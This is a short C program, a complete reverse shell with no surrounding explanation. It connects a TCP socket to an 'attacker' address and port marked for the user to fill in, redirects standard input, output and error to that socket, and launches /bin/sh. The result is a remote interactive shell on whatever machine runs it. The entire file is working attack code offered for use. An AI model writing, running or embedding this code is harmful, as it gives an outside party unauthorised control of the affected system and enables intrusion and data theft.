#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444); // <- YOUR PORT
    attacker.sin_addr.s_addr = inet_addr("192.168.1.10"); // <- YOUR IP

    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
